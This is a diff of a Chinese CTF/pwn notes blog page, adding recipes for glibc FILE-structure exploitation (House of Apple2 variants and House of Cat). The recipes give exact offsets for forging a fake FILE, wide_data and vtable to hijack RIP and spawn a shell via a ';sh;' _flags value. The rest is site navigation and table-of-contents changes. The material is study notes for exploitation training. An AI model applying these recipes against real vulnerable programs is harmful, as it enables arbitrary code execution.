+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">_IO_wdoallocbuf</span> <span class="p">(</span><span class="n">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">)</span> <span class="c1">// 需要_IO_buf_base为0
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_UNBUFFERED</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">((</span><span class="n">wint_t</span><span class="p">)</span><span class="n">_IO_WDOALLOCATE</span> <span class="p">(</span><span class="n">fp</span><span class="p">)</span> <span class="o">!=</span> <span class="n">WEOF</span><span class="p">)</span> <span class="c1">// 调用vtable指针表
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="k">return</span><span class="p">;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>fp</code>设置</p>
+<ul>
+<li><code>_flags</code>设为<code>~(2 | 0x8 | 0x800)</code>，若不需要控制<code>rdi</code>，设置为<code>0</code>即可；若要获得<code>shell</code>，设为<code>;sh;</code></li>
+<li><code>vtable</code>设置为<code>_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap</code>地址（加减偏移），使其能成功调用<code>_IO_wfile_overflow</code>即可</li>
+<li><code>_wide_data</code>设置为可控堆地址<code>A</code>，即<code>*(fp + 0xa0) = A</code></li>
+<li><code>_wide_data-&gt;_IO_write_base</code>设置为<code>0</code>，即<code>*(A + 0x18) = 0</code></li>
+<li><code>_wide_data-&gt;_IO_buf_base</code>设置为<code>0</code>，即<code>*(A + 0x30) = 0</code></li>
+<li><code>_wide_data-&gt;_wide_vtable</code>设置为可控堆地址<code>B</code>，即<code>*(A + 0xe0) = B</code></li>
+<li><code>_wide_data-&gt;_wide_vtable-&gt;doallocate</code>设置为地址<code>C</code>用于劫持<code>RIP</code>，即<code>*(B + 0x68) = C</code></li>
+</ul>
+<p>② <code>_IO_wfile_underflow_mmap</code></p>
+<p><strong>利用</strong></p>
+<p><strong>调用链</strong>：<code>_IO_wfile_underflow_mmap</code> &gt; <code>_IO_wdoallocbuf</code> &gt; <code>_IO_WDOALLOCATE</code> &gt; <code>*(fp-&gt;_wide_data-&gt;_wide_vtable + 0x68)(fp)</code></p>
+<p>板子在 <code>_IO_wfile_overflow</code>基础上更改<code>libc.sym['_IO_wfile_jumps']+0xa8</code>即可，具体需要动态调试确定</p>
+<p><strong>fp构造</strong></p>
+<ul>
+<li><code>_flags</code>设为<code>~4</code>，若不控制<code>rdi</code>，设为<code>0</code>即可；若要获得<code>shell</code>，可设为<code>sh;</code>，注意前面有个空格</li>
+<li><code>vtable</code>设置为<code>_IO_wfile_jumps_mmap</code>地址（加减偏移），使其能成功调用<code>_IO_wfile_underflow_mmap</code>即可</li>
+<li><code>_IO_read_ptr &lt; _IO_read_end</code>，即满足<code>*(fp + 8) &lt; *(fp + 0x10)</code></li>
+<li><code>_wide_data</code>设置为可控堆地址<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li>
+<li><code>_wide_data-&gt;_IO_read_ptr &gt;= _wide_data-&gt;_IO_read_end</code>，即满足<code>*A &gt;= *(A + 8)</code></li>
+<li><code>_wide_data-&gt;_IO_buf_base</code>设置为<code>0</code>，即满足<code>*(A + 0x30) = 0</code></li>
+<li><code>_wide_data-&gt;_IO_save_base</code>设置为<code>0</code>或者合法的可被<code>free</code>的地址，即满足<code>*(A + 0x40) = 0</code></li>
+<li><code>_wide_data-&gt;_wide_vtable</code>设置为可控堆地址<code>B</code>，即满足<code>*(A + 0xe0) = B</code></li>
+<li><code>_wide_data-&gt;_wide_vtable-&gt;doallocate</code>设置为地址<code>C</code>用于劫持<code>RIP</code>，即满足<code>*(B + 0x68) = C</code></li>
+</ul>
+<p>③ <code>_IO_wdefault_xsgetn</code></p>
+<p><strong>条件</strong>：调用到该函数时rdx寄存器(more)不为0</p>
+<p><strong>利用</strong></p>
+<p><strong>调用链</strong>：<code>_IO_wdefault_xsgetn</code> -&gt; <code>__wunderflow</code> -&gt; <code>_IO_switch_to_wget_mode </code>-&gt; <code>_IO_WOVERFLOW</code> -&gt; <code>*(fp-&gt;_wide_data-&gt;_wide_vtable + 0x18)(fp)</code></p>
+<p><strong>fp设置</strong></p>
+<ul>
+<li><code>_flags</code>设置为<code>0x800</code></li>
+<li><code>vtable</code>设置为<code>_IO_wstrn_jumps/_IO_wmem_jumps/_IO_wstr_jumps</code>地址（加减偏移），使其能成功调用<code>_IO_wdefault_xsgetn</code>即可。</li>
+<li><code>_mode</code>设置为大于<code>0</code>，即满足<code>*(fp + 0xc0) &gt; 0</code></li>
+<li><code>_wide_data</code>设置为可控堆地址<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li>
+<li><code>_wide_data-&gt;_IO_read_end == _wide_data-&gt;_IO_read_ptr</code>设置为<code>0</code>，即满足<code>*(A + 8) = *A</code></li>
+<li><code>_wide_data-&gt;_IO_write_ptr &gt; _wide_data-&gt;_IO_write_base</code>，即满足<code>*(A + 0x20) &gt; *(A + 0x18)</code></li>
+<li><code>_wide_data-&gt;_wide_vtable</code>设置为可控堆地址<code>B</code>，即满足<code>*(A + 0xe0) = B</code></li>
+<li><code>_wide_data-&gt;_wide_vtable-&gt;overflow</code>设置为地址<code>C</code>用于劫持<code>RIP</code>，即满足<code>*(B + 0x18) = C</code></li>
+</ul>
+<p>调整fake vtable处</p>
+<p>④ <code>_IO_wfile_seekoff</code>：House of cat</p>
+<p><strong>利用</strong></p>
+<p><strong>调用链</strong>：<code>_IO_wfile_seekoff</code> &gt; <code>_IO_switch_to_wget_mode</code> &gt; <code>_IO_WOVERFLOW</code> &gt; <code>*(fp-&gt;_wide_data-&gt;_wide_vtable + 0x18)(fp)</code></p>
+<p><strong>构造fp</strong></p>
+<ul>
+<li>
+<p><code>_mode</code>不能为0</p>
+</li>
+<li>
+<p><code>_flags</code> 设置为 <code>~0x8</code>，如果不能保证 <code>_lock</code> 指向可读写内存则 <code>_flags |= 0x8000</code>。</p>
+</li>
+<li>
+<p><code>vtable</code>设置为<code>_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap</code>地址（加减偏移），使其能成功调用<code>_IO_wfile_seekoff</code>即可</p>
+</li>
+<li>
+<p><code>_wide_data</code>设置为可控堆地址<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></p>
+</li>
+<li>
+<p><code>_wide_data-&gt;_IO_write_ptr &gt; _wide_data-&gt;_IO_write_base</code> ，即满足<code>*A &gt; *(A + 8)</code></p>
+</li>
+<li>
+<p><code>_wide_data-&gt;_wide_vtable</code>设置为可控堆地址<code>B</code>，即满足<code>*(A + 0xe0) = B</code></p>
+</li>
+<li>
+<p><code>_wide_data-&gt;_wide_vtable-&gt;overflow</code>设置为地址<code>C</code>用于劫持<code>RIP</code>，即满足<code>*(B + 0x18) = C</code></p>
+</li>
+</ul>
+<h5 id="house-of-apple3">House of Apple3</h5>
+<h4 id="house-of-obstack">House of Obstack</h4>
+<h4 id="house-of-snake">House of Snake</h4>
+<h4 id="house-of-魑魅魍魉">House of 魑魅魍魉</h4>
 <h2 id="条件竞争">条件竞争</h2>
 <h3 id="double-fetch">Double Fetch</h3>
 <p><strong>漏洞点</strong></p>
@@ -13976,6 +14891,25 @@
             
                 
 <article class="has-image">
+    <a href="/zh-cn/p/git%E7%AC%94%E8%AE%B0/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/img/note.jpg" loading="lazy" data-key="" data-hash="/img/note.jpg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">GIT笔记</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
     <a href="/zh-cn/p/langchain%E7%AC%94%E8%AE%B0/">
         
         
@@ -14026,25 +14960,6 @@
 
         <div class="article-details">
             <h2 class="article-title">强化学习笔记</h2>
-        </div>
-    </a>
-</article>
-
-            
-                
-<article class="has-image">
-    <a href="/zh-cn/p/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
-        
-        
-            <div class="article-image">
-                
-                    <img src="/img/ai_note.jpg" loading="lazy" data-key="" data-hash="/img/ai_note.jpg"/>
-                
-            </div>
-        
-
-        <div class="article-details">
-            <h2 class="article-title">深度学习笔记</h2>
         </div>
     </a>
 </article>
@@ -14137,7 +15052,9 @@
         
             
         
-        共 186.39k 字 · 共 20篇文章
+            
+        
+        共 204.22k 字 · 共 21篇文章
         <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
 
         <br />本站访客数<span id="busuanzi_value_site_uv"></span>人次---
@@ -14493,7 +15410,6 @@
           <ol>
             <li><a href="#地址泄露-1">地址泄露</a></li>
             <li><a href="#目标地址写大数">目标地址写大数</a></li>
-            <li><a href="#mp_-struct-attack">mp_ struct attack</a></li>
           </ol>
         </li>
         <li><a href="#unsorted-bin-attack">Unsorted bin attack</a>
@@ -14545,6 +15461,14 @@
         <li><a href="#house-of-1">House of</a>
           <ol>
             <li><a href="#house-of-orange">House of Orange</a></li>
+            <li><a href="#house-of-husk">House of Husk</a></li>
+            <li><a href="#house-of-kiwi">House of Kiwi</a></li>
+            <li><a href="#house-of-emma">House of Emma</a></li>
+            <li><a href="#house-of-pig">House of Pig</a></li>
+            <li><a href="#house-of-apple">House of Apple</a></li>
+            <li><a href="#house-of-obstack">House of Obstack</a></li>
+            <li><a href="#house-of-snake">House of Snake</a></li>
+            <li><a href="#house-of-魑魅魍魉">House of 魑魅魍魉</a></li>
           </ol>
         </li>
       </ol>
